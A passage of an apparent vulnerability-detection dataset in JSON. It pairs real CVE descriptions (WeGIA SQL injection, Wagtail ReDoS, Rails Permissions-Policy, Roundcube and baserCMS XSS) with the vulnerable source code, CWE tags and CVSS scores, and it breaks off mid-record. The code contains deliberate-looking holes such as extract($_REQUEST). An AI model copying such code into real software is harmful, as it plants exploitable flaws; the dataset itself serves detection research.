demo_uuid_base_parts.append(str(command_resolved_path))\n\n    if len(sys.argv) > 1:\n        # Component: Arguments of argument vector.\n        demo_uuid_base_parts.extend(sys.argv[1:])\n\n    # _logger.debug(\"demo_uuid_base_parts = %r.\", demo_uuid_base_parts)\n\n    DEMO_UUID_BASE = \"/\".join(demo_uuid_base_parts)"
      ],
      "hunk_level": [
        {
          "line_no": 93,
          "content": "        try:"
        },
        {
          "line_no": 99,
          "content": "        except ValueError:"
        },
        {
          "line_no": 100,
          "content": "            # _logger.debug(\"Command path is not relative to virtual environment path.\")"
        },
        {
          "line_no": 101,
          "content": "            demo_uuid_base_parts.append(str(command_resolved_path))"
        }
      ]
    },
    "cwe": [
      "CWE-215",
      "CWE-337"
    ],
    "severity": "LOW",
    "cvss_score": 2.2,
    "cvss_version": 3.1
  },
  {
    "id": 189,
    "cve": "CVE-2025-52474",
    "description": "WeGIA is a web manager for charitable institutions. Prior to version 3.4.2, a SQL Injection vulnerability was identified in the id parameter of the /WeGIA/controle/control.php endpoint. This vulnerability allows attacker to manipulate SQL queries and access sensitive database information, such as table names and sensitive data. This issue has been patched in version 3.4.2.",
    "vulnerability": {
      "file_level": [
        {
          "name": "controle/pet/MedicamentoControle.php",
          "content": "<?php\n$PetDAO_path = \"dao/pet/SaudePetDAO.php\";\nif(file_exists($PetDAO_path)){\n    require_once($PetDAO_path);\n}else{\n    while(true){\n        $PetDAO_path = \"../\" . $PetDAO_path;\n        if(file_exists($PetDAO_path)) break;\n    }\n    require_once($PetDAO_path);\n}\n\nclass MedicamentoControle{\n    public function adicionarMedicamento(){\n        var_dump($_REQUEST);\n        extract($_REQUEST);\n        $c = new SaudePetDAO();\n        \n        $c->adicionarMedicamento( $nomeMedicamento, $descricaoMedicamento, $aplicacaoMedicamento);\n        if($id){\n           header(\"Location: ../../html/pet/profile_pet.php?id_pet=\".$id);\n        }else{\n            header(\"Location: ../html/pet/informacao_medicamento.php\");\n        }\n    }\n\n    public function listarMedicamento(){\n        $c = new SaudePetDAO();\n        return $c->listarMedicamento();\n    }\n}"
        }
      ],
      "method_level": [
        "public function adicionarMedicamento(){\n        var_dump($_REQUEST);\n        extract($_REQUEST);\n        $c = new SaudePetDAO();\n        \n        $c->adicionarMedicamento( $nomeMedicamento, $descricaoMedicamento, $aplicacaoMedicamento);\n        if($id){\n           header(\"Location: ../../html/pet/profile_pet.php?id_pet=\".$id);\n        }else{\n            header(\"Location: ../html/pet/informacao_medicamento.php\");\n        }\n    }",
        "public function listarMedicamento(){\n        $c = new SaudePetDAO();\n        return $c->listarMedicamento();\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 14,
          "content": "    public function adicionarMedicamento(){"
        },
        {
          "line_no": 15,
          "content": "        var_dump($_REQUEST);"
        },
        {
          "line_no": 16,
          "content": "        extract($_REQUEST);"
        },
        {
          "line_no": 17,
          "content": "        $c = new SaudePetDAO();"
        },
        {
          "line_no": 18,
          "content": "        "
        },
        {
          "line_no": 19,
          "content": "        $c->adicionarMedicamento( $nomeMedicamento, $descricaoMedicamento, $aplicacaoMedicamento);"
        },
        {
          "line_no": 20,
          "content": "        if($id){"
        },
        {
          "line_no": 21,
          "content": "           header(\"Location: ../../html/pet/profile_pet.php?id_pet=\".$id);"
        },
        {
          "line_no": 22,
          "content": "        }else{"
        },
        {
          "line_no": 23,
          "content": "            header(\"Location: ../html/pet/informacao_medicamento.php\");"
        },
        {
          "line_no": 27,
          "content": "    public function listarMedicamento(){"
        }
      ]
    },
    "cwe": [
      "CWE-89"
    ],
    "severity": "HIGH",
    "cvss_score": 8.3,
    "cvss_version": 4.0
  },
  {
    "id": 968,
    "cve": "CVE-2024-39317",
    "description": "Wagtail is an open source content management system built on Django. A bug in Wagtail's `parse_query_string` would result in it taking a long time to process suitably crafted inputs. When used to parse sufficiently long strings of characters without a space, `parse_query_string` would take an unexpectedly large amount of time to process, resulting in a denial of service. In an initial Wagtail installation, the vulnerability can be exploited by any Wagtail admin user. It cannot be exploited by end users. If your Wagtail site has a custom search implementation which uses `parse_query_string`, it may be exploitable by other users (e.g. unauthenticated users). Patched versions have been released as Wagtail 5.2.6, 6.0.6 and 6.1.3.\n",
    "vulnerability": {
      "file_level": [
        {
          "name": "wagtail/search/utils.py",
          "content": "import operator\nimport re\nfrom functools import partial\n\nfrom django.apps import apps\nfrom django.db import connections\nfrom django.http import QueryDict\n\nfrom wagtail.search.index import RelatedFields, SearchField\n\nfrom .query import MATCH_NONE, Phrase, PlainText\n\nNOT_SET = object()\n\n\ndef balanced_reduce(operator, seq, initializer=NOT_SET):\n    \"\"\"\n    Has the same result as Python's reduce function, but performs the calculations in a different order.\n\n    This is important when the operator is constructing data structures such as search query classes.\n    This method will make the resulting data structures flatter, so operations that need to traverse\n    them don't end up crashing with recursion errors.\n\n    For example:\n\n    Python's builtin reduce() function will do the following calculation:\n\n    reduce(add, [1, 2, 3, 4, 5, 6, 7, 8])\n    (1 + (2 + (3 + (4 + (5 + (6 + (7 + 8)))))))\n\n    When using this with query classes, it would create a large data structure with a depth of 7\n    Whereas balanced_reduce will execute this like so:\n\n    balanced_reduce(add, [1, 2, 3, 4, 5, 6, 7, 8])\n    ((1 + 2) + (3 + 4)) + ((5 + 6) + (7 + 8))\n\n    Which only has a depth of 2\n    \"\"\"\n    # Casting all iterables to list makes the implementation simpler\n    if not isinstance(seq, list):\n        seq = list(seq)\n\n    # Note, it needs to be possible to use None as an initial value\n    if initializer is not NOT_SET:\n        if len(seq) == 0:\n            return initializer\n        else:\n            return operator(initializer, balanced_reduce(operator, seq))\n\n    if len(seq) == 0:\n        raise TypeError(\"reduce() of empty sequence with no initial value\")\n    elif len(seq) == 1:\n        return seq[0]\n    else:\n        break_point = len(seq) // 2\n        first_set = balanced_reduce(operator, seq[:break_point])\n        second_set = balanced_reduce(operator, seq[break_point:])\n        return operator(first_set, second_set)\n\n\n# Reduce any iterable to a single value using a logical OR e.g. (a | b | ...)\nOR = partial(balanced_reduce, operator.or_)\n# Reduce any iterable to a single value using a logical AND e.g. (a & b & ...)\nAND = partial(balanced_reduce, operator.and_)\n# Reduce any iterable to a single value using an addition\nADD = partial(balanced_reduce, operator.add)\n# Reduce any iterable to a single value using a multiplication\nMUL = partial(balanced_reduce, operator.mul)\n\nMAX_QUERY_STRING_LENGTH = 255\n\n\ndef normalise_query_string(query_string):\n    # Truncate query string\n    query_string = query_string[:MAX_QUERY_STRING_LENGTH]\n    # Convert query_string to lowercase\n    query_string = query_string.lower()\n\n    # Remove leading, trailing and multiple spaces\n    query_string = re.sub(\" +\", \" \", query_string).strip()\n\n    return query_string\n\n\ndef separate_filters_from_query(query_string):\n    filters_regexp = r'(\\w+):(\\w+|\"[^\"]+\"|\\'[^\\']+\\')'\n\n    filters = QueryDict(mutable=True)\n    for match_object in re.finditer(filters_regexp, query_string):\n        key, value = match_object.groups()\n        filters.update(\n            {\n                key: value.strip('\"')\n                if value.strip('\"') is not value\n                else value.strip(\"'\")\n            }\n        )\n\n    query_string = re.sub(filters_regexp, \"\", query_string).strip()\n\n    return filters, query_string\n\n\ndef parse_query_string(query_string, operator=None, zero_terms=MATCH_NONE):\n    \"\"\"\n    This takes a query string typed in by a user and extracts the following:\n\n     - Quoted terms (for phrase search)\n     - Filters\n\n    For example, the following query:\n\n      `hello \"this is a phrase\" live:true` would be parsed into:\n\n    filters: {'live': 'true'}\n    tokens: And([PlainText('hello'), Phrase('this is a phrase')])\n    \"\"\"\n    filters, query_string = separate_filters_from_query(query_string)\n\n    is_phrase = False\n    tokens = []\n    if '\"' in query_string:\n        parts = query_string.split('\"')\n    else:\n        parts = query_string.split(\"'\")\n\n    for part in parts:\n        part = part.strip()\n\n        if part:\n            if is_phrase:\n                tokens.append(Phrase(part))\n            else:\n                tokens.append(\n                    PlainText(part, operator=operator or PlainText.DEFAULT_OPERATOR)\n                )\n\n        is_phrase = not is_phrase\n\n    if tokens:\n        if operator == \"or\":\n            search_query = OR(tokens)\n        else:\n            search_query = AND(tokens)\n    else:\n        search_query = zero_terms\n\n    return filters, search_query\n\n\ndef get_descendant_models(model):\n    \"\"\"\n    Returns all descendants of a model, including the model itself.\n    \"\"\"\n    descendant_models = {\n        other_model\n        for other_model in apps.get_models()\n        if issubclass(other_model, model)\n    }\n    descendant_models.add(model)\n    return descendant_models\n\n\ndef get_content_type_pk(model):\n    # We import it locally because this file is loaded before apps are ready.\n    from django.contrib.contenttypes.models import ContentType\n\n    return ContentType.objects.get_for_model(model).pk\n\n\ndef get_ancestors_content_types_pks(model):\n    \"\"\"\n    Returns content types ids for the ancestors of this model, excluding it.\n    \"\"\"\n    from django.contrib.contenttypes.models import ContentType\n\n    return [\n        ct.pk\n        for ct in ContentType.objects.get_for_models(\n            *model._meta.get_parent_list()\n        ).values()\n    ]\n\n\ndef get_descendants_content_types_pks(model):\n    \"\"\"\n    Returns content types ids for the descendants of this model, including it.\n    \"\"\"\n    from django.contrib.contenttypes.models import ContentType\n\n    return [\n        ct.pk\n        for ct in ContentType.objects.get_for_models(\n            *get_descendant_models(model)\n        ).values()\n    ]\n\n\ndef get_search_fields(search_fields):\n    for search_field in search_fields:\n        if isinstance(search_field, SearchField):\n            yield search_field\n        elif isinstance(search_field, RelatedFields):\n            yield from get_search_fields(search_field.fields)\n\n\ndef get_postgresql_connections():\n    return [\n        connection\n        for connection in connections.all()\n        if connection.vendor == \"postgresql\"\n    ]\n"
        }
      ],
      "method_level": [
        "def separate_filters_from_query(query_string):\n    filters_regexp = r'(\\w+):(\\w+|\"[^\"]+\"|\\'[^\\']+\\')'\n\n    filters = QueryDict(mutable=True)\n    for match_object in re.finditer(filters_regexp, query_string):\n        key, value = match_object.groups()\n        filters.update(\n            {\n                key: value.strip('\"')\n                if value.strip('\"') is not value\n                else value.strip(\"'\")\n            }\n        )\n\n    query_string = re.sub(filters_regexp, \"\", query_string).strip()\n\n    return filters, query_string"
      ],
      "hunk_level": [
        {
          "line_no": 86,
          "content": "    filters_regexp = r'(\\w+):(\\w+|\"[^\"]+\"|\\'[^\\']+\\')'"
        },
        {
          "line_no": 89,
          "content": "    for match_object in re.finditer(filters_regexp, query_string):"
        },
        {
          "line_no": 91,
          "content": "        filters.update("
        },
        {
          "line_no": 92,
          "content": "            {"
        },
        {
          "line_no": 93,
          "content": "                key: value.strip('\"')"
        },
        {
          "line_no": 94,
          "content": "                if value.strip('\"') is not value"
        },
        {
          "line_no": 95,
          "content": "                else value.strip(\"'\")"
        },
        {
          "line_no": 96,
          "content": "            }"
        },
        {
          "line_no": 97,
          "content": "        )"
        },
        {
          "line_no": 99,
          "content": "    query_string = re.sub(filters_regexp, \"\", query_string).strip()"
        }
      ]
    },
    "cwe": [
      "CWE-1333"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.1
  },
  {
    "id": 792,
    "cve": "CVE-2024-28103",
    "description": "Action Pack is a framework for handling and responding to web requests. Since 6.1.0, the application configurable Permissions-Policy is only served on responses with an HTML related Content-Type. This vulnerability is fixed in  6.1.7.8, 7.0.8.2, and 7.1.3.3.",
    "vulnerability": {
      "file_level": [
        {
          "name": "actionpack/lib/action_dispatch/http/permissions_policy.rb",
          "content": "# frozen_string_literal: true\n\n# :markup: markdown\n\nrequire \"active_support/core_ext/object/deep_dup\"\n\nmodule ActionDispatch # :nodoc:\n  # # Action Dispatch PermissionsPolicy\n  #\n  # Configures the HTTP\n  # [Feature-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Feature-Policy)\n  # response header to specify which browser features the current\n  # document and its iframes can use.\n  #\n  # Example global policy:\n  #\n  #     Rails.application.config.permissions_policy do |policy|\n  #       policy.camera      :none\n  #       policy.gyroscope   :none\n  #       policy.microphone  :none\n  #       policy.usb         :none\n  #       policy.fullscreen  :self\n  #       policy.payment     :self, \"https://secure.example.com\"\n  #     end\n  #\n  # The Feature-Policy header has been renamed to Permissions-Policy. The\n  # Permissions-Policy requires a different implementation and isn't yet supported\n  # by all browsers. To avoid having to rename this middleware in the future we\n  # use the new name for the middleware but keep the old header name and\n  # implementation for now.\n  class PermissionsPolicy\n    class Middleware\n      def initialize(app)\n        @app = app\n      end\n\n      def call(env)\n        _, headers, _ = response = @app.call(env)\n\n        return response unless html_response?(headers)\n        return response if policy_present?(headers)\n\n        request = ActionDispatch::Request.new(env)\n\n        if policy = request.permissions_policy\n          headers[ActionDispatch::Constants::FEATURE_POLICY] = policy.build(request.controller_instance)\n        end\n\n        if policy_empty?(policy)\n          headers.delete(ActionDispatch::Constants::FEATURE_POLICY)\n        end\n\n        response\n      end\n\n      private\n        def html_response?(headers)\n          if content_type = headers[Rack::CONTENT_TYPE]\n            content_type.include?(\"html\")\n          end\n        end\n\n        def policy_present?(headers)\n          headers[ActionDispatch::Constants::FEATURE_POLICY]\n        end\n\n        def policy_empty?(policy)\n          policy&.directives&.empty?\n        end\n    end\n\n    module Request\n      POLICY = \"action_dispatch.permissions_policy\"\n\n      def permissions_policy\n        get_header(POLICY)\n      end\n\n      def permissions_policy=(policy)\n        set_header(POLICY, policy)\n      end\n    end\n\n    MAPPINGS = {\n      self: \"'self'\",\n      none: \"'none'\",\n    }.freeze\n\n    # List of available permissions can be found at\n    # https://github.com/w3c/webappsec-permissions-policy/blob/main/features.md#policy-controlled-features\n    DIRECTIVES = {\n      accelerometer:        \"accelerometer\",\n      ambient_light_sensor: \"ambient-light-sensor\",\n      autoplay:             \"autoplay\",\n      camera:               \"camera\",\n      display_capture:      \"display-capture\",\n      encrypted_media:      \"encrypted-media\",\n      fullscreen:           \"fullscreen\",\n      geolocation:          \"geolocation\",\n      gyroscope:            \"gyroscope\",\n      hid:                  \"hid\",\n      idle_detection:       \"idle-detection\",\n      keyboard_map:         \"keyboard-map\",\n      magnetometer:         \"magnetometer\",\n      microphone:           \"microphone\",\n      midi:                 \"midi\",\n      payment:              \"payment\",\n      picture_in_picture:   \"picture-in-picture\",\n      screen_wake_lock:     \"screen-wake-lock\",\n      serial:               \"serial\",\n      sync_xhr:             \"sync-xhr\",\n      usb:                  \"usb\",\n      web_share:            \"web-share\",\n    }.freeze\n\n    private_constant :MAPPINGS, :DIRECTIVES\n\n    attr_reader :directives\n\n    def initialize\n      @directives = {}\n      yield self if block_given?\n    end\n\n    def initialize_copy(other)\n      @directives = other.directives.deep_dup\n    end\n\n    DIRECTIVES.each do |name, directive|\n      define_method(name) do |*sources|\n        if sources.first\n          @directives[directive] = apply_mappings(sources)\n        else\n          @directives.delete(directive)\n        end\n      end\n    end\n\n    def build(context = nil)\n      build_directives(context).compact.join(\"; \")\n    end\n\n    private\n      def apply_mappings(sources)\n        sources.map do |source|\n          case source\n          when Symbol\n            apply_mapping(source)\n          when String, Proc\n            source\n          else\n            raise ArgumentError, \"Invalid HTTP permissions policy source: #{source.inspect}\"\n          end\n        end\n      end\n\n      def apply_mapping(source)\n        MAPPINGS.fetch(source) do\n          raise ArgumentError, \"Unknown HTTP permissions policy source mapping: #{source.inspect}\"\n        end\n      end\n\n      def build_directives(context)\n        @directives.map do |directive, sources|\n          if sources.is_a?(Array)\n            \"#{directive} #{build_directive(sources, context).join(' ')}\"\n          elsif sources\n            directive\n          else\n            nil\n          end\n        end\n      end\n\n      def build_directive(sources, context)\n        sources.map { |source| resolve_source(source, context) }\n      end\n\n      def resolve_source(source, context)\n        case source\n        when String\n          source\n        when Symbol\n          source.to_s\n        when Proc\n          if context.nil?\n            raise RuntimeError, \"Missing context for the dynamic permissions policy source: #{source.inspect}\"\n          else\n            context.instance_exec(&source)\n          end\n        else\n          raise RuntimeError, \"Unexpected permissions policy source: #{source.inspect}\"\n        end\n      end\n  end\nend\n"
        }
      ],
      "method_level": [
        "def call(env)\n        _, headers, _ = response = @app.call(env)\n\n        return response unless html_response?(headers)\n        return response if policy_present?(headers)\n\n        request = ActionDispatch::Request.new(env)\n\n        if policy = request.permissions_policy\n          headers[ActionDispatch::Constants::FEATURE_POLICY] = policy.build(request.controller_instance)\n        end\n\n        if policy_empty?(policy)\n          headers.delete(ActionDispatch::Constants::FEATURE_POLICY)\n        end\n\n        response\n      end",
        "def html_response?(headers)\n          if content_type = headers[Rack::CONTENT_TYPE]\n            content_type.include?(\"html\")\n          end\n        end"
      ],
      "hunk_level": [
        {
          "line_no": 40,
          "content": "        return response unless html_response?(headers)"
        },
        {
          "line_no": 57,
          "content": "        def html_response?(headers)"
        },
        {
          "line_no": 58,
          "content": "          if content_type = headers[Rack::CONTENT_TYPE]"
        },
        {
          "line_no": 59,
          "content": "            content_type.include?(\"html\")"
        },
        {
          "line_no": 60,
          "content": "          end"
        },
        {
          "line_no": 61,
          "content": "        end"
        }
      ]
    },
    "cwe": [
      "CWE-20"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.4,
    "cvss_version": 3.1
  },
  {
    "id": 830,
    "cve": "CVE-2024-37384",
    "description": "Roundcube Webmail before 1.5.7 and 1.6.x before 1.6.7 allows XSS via list columns from user preferences.",
    "vulnerability": {
      "file_level": [
        {
          "name": "program/actions/mail/list.php",
          "content": "<?php\n\n/**\n +-----------------------------------------------------------------------+\n | This file is part of the Roundcube Webmail client                     |\n |                                                                       |\n | Copyright (C) The Roundcube Dev Team                                  |\n |                                                                       |\n | Licensed under the GNU General Public License version 3 or            |\n | any later version with exceptions for skins & plugins.                |\n | See the README file for a full license statement.                     |\n |                                                                       |\n | PURPOSE:                                                              |\n |   Send message list to client (as remote response)                    |\n +-----------------------------------------------------------------------+\n | Author: Thomas Bruederli <roundcube@gmail.com>                        |\n +-----------------------------------------------------------------------+\n*/\n\nclass rcmail_action_mail_list extends rcmail_action_mail_index\n{\n    protected static $mode = self::MODE_AJAX;\n\n    /**\n     * Request handler.\n     *\n     * @param array $args Arguments from the previous step(s)\n     */\n    public function run($args = [])\n    {\n        $rcmail        = rcmail::get_instance();\n        $save_arr      = [];\n        $dont_override = (array) $rcmail->config->get('dont_override');\n        $cols          = null;\n\n        // is there a sort type for this request?\n        $sort = rcube_utils::get_input_string('_sort', rcube_utils::INPUT_GET);\n        if ($sort && preg_match('/^[a-zA-Z_-]+$/', $sort)) {\n            // yes, so set the sort vars\n            list($sort_col, $sort_order) = explode('_', $sort);\n\n            // set session vars for sort (so next page and task switch know how to sort)\n            if (!in_array('message_sort_col', $dont_override)) {\n                $_SESSION['sort_col'] = $save_arr['message_sort_col'] = $sort_col;\n            }\n            if (!in_array('message_sort_order', $dont_override)) {\n                $_SESSION['sort_order'] = $save_arr['message_sort_order'] = $sort_order;\n            }\n        }\n\n        // is there a set of columns for this request?\n        if ($cols = rcube_utils::get_input_string('_cols', rcube_utils::INPUT_GET)) {\n            $_SESSION['list_attrib']['columns'] = explode(',', $cols);\n            if (!in_array('list_cols', $dont_override)) {\n                $save_arr['list_cols'] = explode(',', $cols);\n            }\n        }\n\n        // register layout change\n        if ($layout = rcube_utils::get_input_string('_layout', rcube_utils::INPUT_GET)) {\n            $rcmail->output->set_env('layout', $layout);\n            $save_arr['layout'] = $layout;\n            // force header replace on layout change\n            if (!empty($_SESSION['list_attrib']['columns'])) {\n                $cols = $_SESSION['list_attrib']['columns'];\n            }\n        }\n\n        if (!empty($save_arr)) {\n            $rcmail->user->save_prefs($save_arr);\n        }\n\n        $mbox_name = $rcmail->storage->get_folder();\n        $threading = (bool) $rcmail->storage->get_threading();\n\n        // Synchronize mailbox cache, handle flag changes\n        $rcmail->storage->folder_sync($mbox_name);\n\n        // fetch message headers\n        $a_headers = [];\n        if ($count = $rcmail->storage->count($mbox_name, $threading ? 'THREADS' : 'ALL', !empty($_REQUEST['_refresh']))) {\n            $a_headers = $rcmail->storage->list_messages($mbox_name, null, self::sort_column(), self::sort_order());\n        }\n\n        // update search set (possible change of threading mode)\n        if (!empty($_REQUEST['_search']) && isset($_SESSION['search'])\n            && $_SESSION['search_request'] == $_REQUEST['_search']\n        ) {\n            $search_request = $_REQUEST['_search'];\n            $_SESSION['search'] = $rcmail->storage->get_search_set();\n            $multifolder = !empty($_SESSION['search']) && !empty($_SESSION['search'][1]->multi);\n        }\n        // remove old search data\n        else if (empty($_REQUEST['_search']) && isset($_SESSION['search'])) {\n            $rcmail->session->remove('search');\n        }\n\n        self::list_pagetitle();\n\n        // update mailboxlist\n        if (empty($search_request)) {\n            self::send_unread_count($mbox_name, !empty($_REQUEST['_refresh']), empty($a_headers) ? 0 : null);\n        }\n\n        // update message count display\n        $pages  = ceil($count / $rcmail->storage->get_pagesize());\n        $page   = $count ? $rcmail->storage->get_page() : 1;\n        $exists = $rcmail->storage->count($mbox_name, 'EXISTS', true);\n\n        $rcmail->output->set_env('messagecount', $count);\n        $rcmail->output->set_env('pagecount', $pages);\n        $rcmail->output->set_env('threading', $threading);\n        $rcmail->output->set_env('current_page', $page);\n        $rcmail->output->set_env('exists', $exists);\n        $rcmail->output->command('set_rowcount', self::get_messagecount_text($count), $mbox_name);\n\n        // remove old message rows if commanded by the client\n        if (!empty($_REQUEST['_clear'])) {\n            $rcmail->output->command('clear_message_list');\n        }\n\n        // add message rows\n        self::js_message_list($a_headers, false, $cols);\n\n        if (!empty($a_headers)) {\n            if (!empty($search_request)) {\n                $rcmail->output->show_message('searchsuccessful', 'confirmation', ['nr' => $count]);\n            }\n\n            // remember last HIGHESTMODSEQ value (if supported)\n            // we need it for flag updates in check-recent\n            $data = $rcmail->storage->folder_data($mbox_name);\n            if (!empty($data['HIGHESTMODSEQ'])) {\n                $_SESSION['list_mod_seq'] = $data['HIGHESTMODSEQ'];\n            }\n        }\n        else {\n            // handle IMAP errors (e.g. #1486905)\n            if ($err_code = $rcmail->storage->get_error_code()) {\n                self::display_server_error();\n            }\n            else if (!empty($search_request)) {\n                $rcmail->output->show_message('searchnomatch', 'notice');\n            }\n            else {\n                $rcmail->output->show_message('nomessagesfound', 'notice');\n            }\n        }\n\n        // set trash folder state\n        if ($mbox_name === $rcmail->config->get('trash_mbox')) {\n            $rcmail->output->command('set_trash_count', $exists);\n        }\n\n        if ($page == 1) {\n            $rcmail->output->command('set_quota', self::quota_content(null, !empty($multifolder) ? 'INBOX' : $mbox_name));\n        }\n\n        // send response\n        $rcmail->output->send();\n    }\n}\n"
        }
      ],
      "method_level": [
        "public function run($args = [])\n    {\n        $rcmail        = rcmail::get_instance();\n        $save_arr      = [];\n        $dont_override = (array) $rcmail->config->get('dont_override');\n        $cols          = null;\n\n        // is there a sort type for this request?\n        $sort = rcube_utils::get_input_string('_sort', rcube_utils::INPUT_GET);\n        if ($sort && preg_match('/^[a-zA-Z_-]+$/', $sort)) {\n            // yes, so set the sort vars\n            list($sort_col, $sort_order) = explode('_', $sort);\n\n            // set session vars for sort (so next page and task switch know how to sort)\n            if (!in_array('message_sort_col', $dont_override)) {\n                $_SESSION['sort_col'] = $save_arr['message_sort_col'] = $sort_col;\n            }\n            if (!in_array('message_sort_order', $dont_override)) {\n                $_SESSION['sort_order'] = $save_arr['message_sort_order'] = $sort_order;\n            }\n        }\n\n        // is there a set of columns for this request?\n        if ($cols = rcube_utils::get_input_string('_cols', rcube_utils::INPUT_GET)) {\n            $_SESSION['list_attrib']['columns'] = explode(',', $cols);\n            if (!in_array('list_cols', $dont_override)) {\n                $save_arr['list_cols'] = explode(',', $cols);\n            }\n        }\n\n        // register layout change\n        if ($layout = rcube_utils::get_input_string('_layout', rcube_utils::INPUT_GET)) {\n            $rcmail->output->set_env('layout', $layout);\n            $save_arr['layout'] = $layout;\n            // force header replace on layout change\n            if (!empty($_SESSION['list_attrib']['columns'])) {\n                $cols = $_SESSION['list_attrib']['columns'];\n            }\n        }\n\n        if (!empty($save_arr)) {\n            $rcmail->user->save_prefs($save_arr);\n        }\n\n        $mbox_name = $rcmail->storage->get_folder();\n        $threading = (bool) $rcmail->storage->get_threading();\n\n        // Synchronize mailbox cache, handle flag changes\n        $rcmail->storage->folder_sync($mbox_name);\n\n        // fetch message headers\n        $a_headers = [];\n        if ($count = $rcmail->storage->count($mbox_name, $threading ? 'THREADS' : 'ALL', !empty($_REQUEST['_refresh']))) {\n            $a_headers = $rcmail->storage->list_messages($mbox_name, null, self::sort_column(), self::sort_order());\n        }\n\n        // update search set (possible change of threading mode)\n        if (!empty($_REQUEST['_search']) && isset($_SESSION['search'])\n            && $_SESSION['search_request'] == $_REQUEST['_search']\n        ) {\n            $search_request = $_REQUEST['_search'];\n            $_SESSION['search'] = $rcmail->storage->get_search_set();\n            $multifolder = !empty($_SESSION['search']) && !empty($_SESSION['search'][1]->multi);\n        }\n        // remove old search data\n        else if (empty($_REQUEST['_search']) && isset($_SESSION['search'])) {\n            $rcmail->session->remove('search');\n        }\n\n        self::list_pagetitle();\n\n        // update mailboxlist\n        if (empty($search_request)) {\n            self::send_unread_count($mbox_name, !empty($_REQUEST['_refresh']), empty($a_headers) ? 0 : null);\n        }\n\n        // update message count display\n        $pages  = ceil($count / $rcmail->storage->get_pagesize());\n        $page   = $count ? $rcmail->storage->get_page() : 1;\n        $exists = $rcmail->storage->count($mbox_name, 'EXISTS', true);\n\n        $rcmail->output->set_env('messagecount', $count);\n        $rcmail->output->set_env('pagecount', $pages);\n        $rcmail->output->set_env('threading', $threading);\n        $rcmail->output->set_env('current_page', $page);\n        $rcmail->output->set_env('exists', $exists);\n        $rcmail->output->command('set_rowcount', self::get_messagecount_text($count), $mbox_name);\n\n        // remove old message rows if commanded by the client\n        if (!empty($_REQUEST['_clear'])) {\n            $rcmail->output->command('clear_message_list');\n        }\n\n        // add message rows\n        self::js_message_list($a_headers, false, $cols);\n\n        if (!empty($a_headers)) {\n            if (!empty($search_request)) {\n                $rcmail->output->show_message('searchsuccessful', 'confirmation', ['nr' => $count]);\n            }\n\n            // remember last HIGHESTMODSEQ value (if supported)\n            // we need it for flag updates in check-recent\n            $data = $rcmail->storage->folder_data($mbox_name);\n            if (!empty($data['HIGHESTMODSEQ'])) {\n                $_SESSION['list_mod_seq'] = $data['HIGHESTMODSEQ'];\n            }\n        }\n        else {\n            // handle IMAP errors (e.g. #1486905)\n            if ($err_code = $rcmail->storage->get_error_code()) {\n                self::display_server_error();\n            }\n            else if (!empty($search_request)) {\n                $rcmail->output->show_message('searchnomatch', 'notice');\n            }\n            else {\n                $rcmail->output->show_message('nomessagesfound', 'notice');\n            }\n        }\n\n        // set trash folder state\n        if ($mbox_name === $rcmail->config->get('trash_mbox')) {\n            $rcmail->output->command('set_trash_count', $exists);\n        }\n\n        if ($page == 1) {\n            $rcmail->output->command('set_quota', self::quota_content(null, !empty($multifolder) ? 'INBOX' : $mbox_name));\n        }\n\n        // send response\n        $rcmail->output->send();\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 34,
          "content": "        $cols          = null;"
        },
        {
          "line_no": 36,
          "content": "        // is there a sort type for this request?"
        },
        {
          "line_no": 52,
          "content": "        if ($cols = rcube_utils::get_input_string('_cols', rcube_utils::INPUT_GET)) {"
        },
        {
          "line_no": 60,
          "content": "        if ($layout = rcube_utils::get_input_string('_layout', rcube_utils::INPUT_GET)) {"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.1,
    "cvss_version": 3.1
  },
  {
    "id": 327,
    "cve": "CVE-2024-26128",
    "description": "baserCMS is a website development framework. Prior to version 5.0.9, there is a cross-site scripting vulnerability in the content management feature. Version 5.0.9 contains a fix for this vulnerability.",
    "vulnerability": {
      "file_level": [
        {
          "name": "plugins/baser-core/src/View/Helper/BcAdminFormHelper.php",
          "content": "<?php\n/**\n * baserCMS :  Based Website Development Project <https://basercms.net>\n * Copyright (c) NPO baser foundation <https://baserfoundation.org/>\n *\n * @copyright     Copyright (c) NPO baser foundation\n * @link          https://basercms.net baserCMS Project\n * @since         5.0.0\n * @license       https://basercms.net/license/index.html MIT License\n */\n\nnamespace BaserCore\\View\\Helper;\n\nuse BaserCore\\Annotation\\NoTodo;\nuse BaserCore\\Annotation\\Checked;\nuse BaserCore\\Annotation\\UnitTest;\nuse BaserCore\\Event\\BcEventDispatcherTrait;\n\n/**\n * Class BcAdminFormHelper\n */\nclass BcAdminFormHelper extends BcFormHelper\n{\n    /**\n     * Trait\n     */\n    use BcEventDispatcherTrait;\n\n    /**\n     * control\n     * @param string $fieldName\n     * @param array $options\n     * @return string\n     * @checked\n     * @noTodo\n     * @unitTest\n     */\n    public function control(string $fieldName, array $options = []): string\n    {\n        if (empty($options['type'])) {\n            $options['type'] = $this->_inputType($fieldName, $options);\n        }\n        if (!empty($options['type'])) {\n            $options = array_replace_recursive([\n                'label' => false,\n                'legend' => false,\n                'error' => false,\n                'templateVars' => ['tag' => 'span', 'groupTag' => 'span']\n            ], $options);\n            $class = 'bca-hidden__input';\n            $containerClass = 'bca-hidden';\n            $labelClass = $groupContainerClass = $label = '';\n            switch($options['type']) {\n                case 'file':\n                    $class = 'bca-file__input';\n                    $containerClass = 'bca-file';\n                    $options = array_replace_recursive([\n                        'link' => ['class' => 'bca-file__link'],\n                        'class' => 'bca-file__input',\n                        'templateVars' => ['tag' => 'span', 'class' => 'bca-file'],\n                        'deleteSpan' => ['class' => 'bca-file__delete'],\n                        'deleteCheckbox' => ['class' => 'bca-file__delete-input', 'id' => true],\n                        'deleteLabel' => ['class' => 'bca-file__delete-label'],\n                        'figure' => ['class' => 'bca-file__figure'],\n                        'img' => ['class' => 'bca-file__img'],\n                        'figcaption' => ['class' => 'bca-file__figcaption']\n                    ], $options);\n                    break;\n                case 'dateTimePicker':\n                    $containerClass = 'bca-datetimepicker';\n                    $options = array_replace_recursive([\n                        'dateInput' => ['class' => 'bca-datetimepicker__date-input'],\n                        'dateDiv' => ['tag' => 'span', 'class' => 'bca-datetimepicker__date'],\n                        'dateLabel' => ['text' => 